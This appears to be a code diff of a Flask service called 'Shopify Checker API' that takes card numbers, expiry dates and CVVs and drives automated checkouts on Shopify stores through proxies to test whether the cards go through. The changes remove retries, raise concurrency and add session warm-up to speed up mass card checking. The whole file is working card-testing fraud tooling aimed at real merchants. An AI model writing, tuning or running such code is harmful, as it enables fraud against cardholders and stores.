@@ -5,9 +5,8 @@ deps: pip install "flask[async]" aiohttp aiohttp-socks
 
 Production recommended:
     pip install gunicorn
-    gunicorn -w 4 -k gthread --threads 16 --timeout 180 \
-             --max-requests 2000 --max-requests-jitter 200 \
-             -b 0.0.0.0:8073 api:app
+    gunicorn -w 8 -k gthread --threads 32 --timeout 180 \
+             --worker-connections 1000 -b 0.0.0.0:8073 api:app
 """
 import asyncio
 import aiohttp
@@ -34,12 +33,8 @@ except ImportError:
 
 
 # =====================================================================
-# RETRY / CLEANUP CONFIG
+# CONFIG (retry config removed — single attempt per step)
 # =====================================================================
-FETCH_RETRIES = int(os.getenv("FETCH_RETRIES", "3"))
-CART_RETRIES = int(os.getenv("CART_RETRIES", "3"))
-RETRY_BACKOFF = float(os.getenv("RETRY_BACKOFF", "0.5"))
-
 # Cache caps
 VARIANT_CACHE_MAX = int(os.getenv("VARIANT_CACHE_MAX", "5000"))
 VARIANT_CACHE_TTL = int(os.getenv("VARIANT_CACHE_TTL", "3600"))
@@ -48,8 +43,8 @@ LOG_MAX_BYTES = int(os.getenv("LOG_MAX_BYTES", "5000000"))
 LOG_BACKUPS = int(os.getenv("LOG_BACKUPS", "2"))
 LOG_MAX_AGE_DAYS = int(os.getenv("LOG_MAX_AGE_DAYS", "3"))
 
-# 🔥 Perf tuning
-MAX_CONCURRENT_CHECKOUTS = int(os.getenv("MAX_CONCURRENT_CHECKOUTS", "30"))
+# Perf tuning
+MAX_CONCURRENT_CHECKOUTS = int(os.getenv("MAX_CONCURRENT_CHECKOUTS", "50"))
 CACHE_FLUSH_INTERVAL = int(os.getenv("CACHE_FLUSH_INTERVAL", "10"))
 SESSION_POOL_LIMIT = int(os.getenv("SESSION_POOL_LIMIT", "100"))
 SESSION_POOL_LIMIT_PER_HOST = int(os.getenv("SESSION_POOL_LIMIT_PER_HOST", "30"))
@@ -135,13 +130,12 @@ def cleanup_old_logs():
 
 
 # =====================================================================
-# PERSISTENT EVENT LOOP (per thread — gunicorn workers/threads safe)
+# PERSISTENT EVENT LOOP (per thread)
 # =====================================================================
 _tls = threading.local()
 
 
 def get_event_loop():
-    """Return a per-thread event loop. Creates one on first use, reuses after."""
     loop = getattr(_tls, "loop", None)
     if loop is None or loop.is_closed():
         loop = asyncio.new_event_loop()
@@ -151,7 +145,7 @@ def get_event_loop():
 
 
 # =====================================================================
-# VARIANT CACHE (with LRU eviction + TTL purge + debounced disk write)
+# VARIANT CACHE
 # =====================================================================
 VARIANT_CACHE_FILE = os.getenv("VARIANT_CACHE_FILE", "variant_cache.json")
 _variant_cache = {}
@@ -180,14 +174,12 @@ def load_variant_cache():
 
 
 def save_variant_cache():
-    """Mark cache dirty — actual write happens in cleanup worker (debounced)."""
     global _cache_dirty
     with _cache_lock:
         _cache_dirty = True
 
 
 def _flush_cache_now(force=False):
-    """Write cache to disk if dirty and enough time passed (or forced)."""
     global _cache_dirty, _cache_last_save
     with _cache_save_lock:
         if not _cache_dirty:
@@ -218,7 +210,6 @@ def get_cached_variant(domain):
 
 
 def set_cached_variant(domain, variant_id, price, requires_shipping, handle=None):
-    """Update in-memory cache (fast). Disk write is debounced."""
     global _cache_dirty
     domain = domain.rstrip("/")
     with _cache_lock:
@@ -241,6 +232,7 @@ def set_cached_variant(domain, variant_id, price, requires_shipping, handle=None
 def purge_expired_cache():
     now = time.time()
     removed = 0
+    global _cache_dirty
     with _cache_lock:
         for k in list(_variant_cache.keys()):
             v = _variant_cache.get(k) or {}
@@ -248,7 +240,6 @@ def purge_expired_cache():
                 _variant_cache.pop(k, None)
                 removed += 1
         if removed:
-            global _cache_dirty
             _cache_dirty = True
     if removed:
         logger.info(f"cache purge: removed {removed} expired entries")
@@ -280,10 +271,9 @@ _cleanup_thread.start()
 
 
 # =====================================================================
-# GLOBAL CONCURRENCY CONTROL (per thread semaphore)
+# GLOBAL CONCURRENCY CONTROL (per thread)
 # =====================================================================
 def _get_global_sem():
-    """Each thread gets its own semaphore (gunicorn workers/threads safe)."""
     sem = getattr(_tls, "global_sem", None)
     if sem is None:
         sem = asyncio.Semaphore(MAX_CONCURRENT_CHECKOUTS)
@@ -292,7 +282,7 @@ def _get_global_sem():
 
 
 # =====================================================================
-# PER-THREAD HTTP SESSION POOL (huge speed win on repeated calls)
+# PER-THREAD HTTP SESSION POOL
 # =====================================================================
 def _get_thread_pool():
     if not hasattr(_tls, "sessions"):
@@ -301,9 +291,6 @@ def _get_thread_pool():
 
 
 async def get_pooled_session(key: str, timeout_total: int = 30):
-    """Get or create a persistent aiohttp.ClientSession for this thread.
-    Reused across requests → no TCP/TLS handshake per request.
-    """
     pool = _get_thread_pool()
     sess = pool.get(key)
     if sess is None or sess.closed:
@@ -321,21 +308,6 @@ async def get_pooled_session(key: str, timeout_total: int = 30):
         )
         pool[key] = sess
     return sess
-
-
-def close_all_pooled_sessions():
-    """Utility — rarely needed."""
-    pool = getattr(_tls, "sessions", None)
-    if not pool:
-        return
-    loop = get_event_loop()
-    for k, s in list(pool.items()):
-        try:
-            if not s.closed:
-                loop.run_until_complete(s.close())
-        except Exception:
-            pass
-        pool.pop(k, None)
 
 
 # =====================================================================
@@ -584,26 +556,24 @@ def get_operation_name(query_str):
     return m.group(1) if m else None
 
 
-async def post_with_retry(session, url, data=None, json=None, headers=None,
-                          proxy=None, max_retries=2, backoff=0.5):
-    for attempt in range(max_retries):
-        try:
-            async with session.post(url, data=data, json=json, headers=headers, proxy=proxy) as resp:
-                if resp.status == 429:
-                    await asyncio.sleep(backoff * (2 ** attempt) + random.uniform(0, 1))
-                    continue
-                return resp
-        except (aiohttp.ClientError, asyncio.TimeoutError):
-            if attempt == max_retries - 1:
-                raise
-            await asyncio.sleep(backoff * (2 ** attempt))
-    return None
+# NOTE: post_with_retry() removed (was dead code)
 
 
 # =====================================================================
-# SESSION WARM-UP (unchanged)
+# SESSION WARM-UP
 # =====================================================================
 async def warm_session(session, domain, proxy=None):
+    # skip if we've already warmed this domain in this session
+    warmed = getattr(session, "_warmed_domains", None)
+    if warmed is None:
+        warmed = set()
+        try:
+            session._warmed_domains = warmed
+        except Exception:
+            pass
+    if domain in warmed:
+        return
+    warmed.add(domain)
     try:
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
@@ -624,7 +594,7 @@ async def warm_session(session, domain, proxy=None):
 
 
 # =====================================================================
-# PRODUCT FETCH (unchanged logic)
+# PRODUCT FETCH (retry removed)
 # =====================================================================
 async def fetch_products(domain, proxy_str=None, force_refresh=False):
     domain = domain.rstrip("/")
@@ -803,7 +773,7 @@ async def fetch_products(domain, proxy_str=None, force_refresh=False):
 
 
 # =====================================================================
-# ADD TO CART (unchanged logic)
+# ADD TO CART (fallback strategies kept, retries removed)
 # =====================================================================
 async def add_to_cart_async(session, domain, variant_id, proxy=None):
     domain = domain.rstrip("/")
@@ -889,10 +859,10 @@ async def add_to_cart_async(session, domain, variant_id, proxy=None):
 
 
 # =====================================================================
-# CORE: process_card — LOGIC UNCHANGED, only wrapped with concurrency guard
+# CORE: process_card — retries removed
 # =====================================================================
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    """Thin wrapper that adds a global concurrency guard."""
+    """Thin wrapper with global concurrency guard."""
     sem = _get_global_sem()
     async with sem:
         return await _process_card_inner(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
@@ -936,6 +906,7 @@ async def _process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, prox
         state = address_info["zoneCode"]
         s_zip = address_info["postalCode"]
 
+        # primary domain (single attempt)
         primary_domain = None
         try:
             async with aiohttp.ClientSession() as temp_session:
@@ -956,23 +927,15 @@ async def _process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, prox
         if primary_domain:
             ourl = primary_domain
 
+        # product fetch — single attempt (no retry)
         if not variant_id:
-            info, err = None, None
-            for fetch_attempt in range(FETCH_RETRIES):
-                force = fetch_attempt > 0
-                info, err = await fetch_products(ourl, proxy_str, force_refresh=force)
+            info, err = await fetch_products(ourl, proxy_str, force_refresh=False)
+            # one alternate domain attempt (different URL — not a retry)
+            if (info is False or info is None) and not ourl.startswith("https://www."):
+                www = ourl.replace("https://", "https://www.")
+                info, err = await fetch_products(www, proxy_str, force_refresh=True)
                 if info is not False and info is not None:
-                    break
-                if not ourl.startswith("https://www."):
-                    www = ourl.replace("https://", "https://www.")
-                    info, err = await fetch_products(www, proxy_str, force_refresh=True)
-                    if info is not False and info is not None:
-                        ourl = www
-                        break
-                if fetch_attempt < FETCH_RETRIES - 1:
-                    wait = RETRY_BACKOFF * (2 ** fetch_attempt) + random.uniform(0, 0.8)
-                    logger.warning(f"fetch attempt {fetch_attempt+1}/{FETCH_RETRIES} failed ({err}) — wait {wait:.1f}s")
-                    await asyncio.sleep(wait)
+                    ourl = www
             if info is False or info is None:
                 return False, err or "Product fetch failed", gateway, total_price, currency, proxy_ok
             variant_id = info["variant_id"]
@@ -982,16 +945,8 @@ async def _process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, prox
         timeout = aiohttp.ClientTimeout(total=18)
 
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            cart_resp = None
-            for cart_attempt in range(CART_RETRIES):
-                cart_resp = await add_to_cart_async(session, ourl, variant_id, proxy_url)
-                if cart_resp and cart_resp.status in (200, 201, 302):
-                    break
-                if cart_attempt < CART_RETRIES - 1:
-                    status = cart_resp.status if cart_resp else "NO_RESPONSE"
-                    wait = RETRY_BACKOFF * (2 ** cart_attempt) + random.uniform(0, 0.5)
-                    logger.warning(f"cart attempt {cart_attempt+1}/{CART_RETRIES} failed ({status}) — wait {wait:.1f}s")
-                    await asyncio.sleep(wait)
+            # cart — single attempt (no retry)
+            cart_resp = await add_to_cart_async(session, ourl, variant_id, proxy_url)
             if not cart_resp or cart_resp.status not in (200, 201, 302):
                 status = cart_resp.status if cart_resp else "NO_RESPONSE"
                 return False, f"Cart failed with status {status}", gateway, total_price, currency, proxy_ok
@@ -1227,16 +1182,12 @@ async def _process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, prox
                 "operationName": proposal_op,
             }
 
-            proposal_text = None
-            for attempt in range(2):
-                try:
-                    proposal_text, _ = await make_graphql_request(json_data)
-                    break
-                except Exception as e:
-                    if attempt == 0:
-                        continue
-                    proxy_ok = False
-                    return False, f"Shipping proposal error: {str(e)}", gateway, total_price, currency, proxy_ok
+            # shipping proposal — single attempt (no retry)
+            try:
+                proposal_text, _ = await make_graphql_request(json_data)
+            except Exception as e:
+                proxy_ok = False
+                return False, f"Shipping proposal error: {str(e)}", gateway, total_price, currency, proxy_ok
 
             if not proposal_text:
                 return False, "Shipping proposal failed", gateway, total_price, currency, proxy_ok
@@ -1469,6 +1420,7 @@ async def _process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, prox
             if float(final_total) <= 0:
                 final_total = str(max(0.01, float(merchandise_total or subtotal)))
 
+            # PCI vault — fallback strategies kept (they are different approaches, not retries)
             payload = {
                 "credit_card": {
                     "number": cc, "month": int(mes), "year": int(ano),
@@ -1671,6 +1623,7 @@ async def _process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, prox
             else:
                 return False, f"Unknown submit type: {result_type}", gateway, attempted_price, currency, proxy_ok
 
+            # poll loop (this is polling, not retry — kept)
             poll_op = get_operation_name(QUERY_POLL) or "PollForReceipt"
             poll_json = {
                 "query": QUERY_POLL,
@@ -1785,7 +1738,7 @@ def shopify_checker():
         except ValueError as e:
             return pretty_jsonify({"error": str(e), "status": False}), 400
 
-        # 🔥 per-thread persistent event loop (no new loop per request)
+        # per-thread persistent event loop
         loop = get_event_loop()
         try:
             success, message, gateway, price, currency, proxy_ok = loop.run_until_complete(
@@ -1887,27 +1840,27 @@ def index():
     with _cache_lock:
         cache_size = len(_variant_cache)
     return pretty_jsonify({
-        "name": "Shopify Checker API (reference-style, modern)",
+        "name": "Shopify Checker API (retry-free, perf-tuned)",
         "endpoint": "/shopify?site=URL&cc=CC|MM|YYYY|CVV&proxy=PROXY",
         "active_checkouts": active,
         "cached_sites": cache_size,
         "features": [
+            "Retry-free single-attempt flow (faster)",
             "GraphQL-first product fetch with REST pagination + sitemap fallback",
-            "Session warm-up before cart add",
+            "Session warm-up (once per domain per session)",
             "Persisted GraphQL endpoint support",
             "CheckpointData propagation",
             "Dynamic poll delays from pollDelay",
-            "PCI vault fallback strategies (5 attempts)",
+            "PCI vault fallback strategies (kept — different approaches, not retries)",
             "requiresShipping detection",
             "Variant cache with TTL + LRU eviction",
-            "Debounced cache disk writes (perf)",
-            "Auto cleanup of cache + old logs (background thread)",
+            "Debounced cache disk writes",
+            "Auto cleanup of cache + old logs",
             "Primary domain resolution",
             "Multi-scheme proxy support (http/https/socks4/socks5)",
             "Request IDs + rotating logs + JSON logging option",
-            "Retry on NO_RESPONSE / No products found",
-            "Per-thread persistent event loop (perf)",
-            "Global concurrency guard via semaphore (perf)",
+            "Per-thread persistent event loop",
+            "Global concurrency guard via semaphore",
         ],
     })
 
@@ -1916,7 +1869,6 @@ if __name__ == "__main__":
     logger.info(f"starting on {os.getenv('HOST', '0.0.0.0')}:{int(os.getenv('PORT', '8073'))}")
     if not HAS_SOCKS:
         logger.warning("aiohttp_socks missing — socks proxies will fall back to http")
-    # 🔥 threaded=True ensures dev server can handle concurrent requests
     app.run(
         host=os.getenv("HOST", "0.0.0.0"),
         port=int(os.getenv("PORT", "8073")),
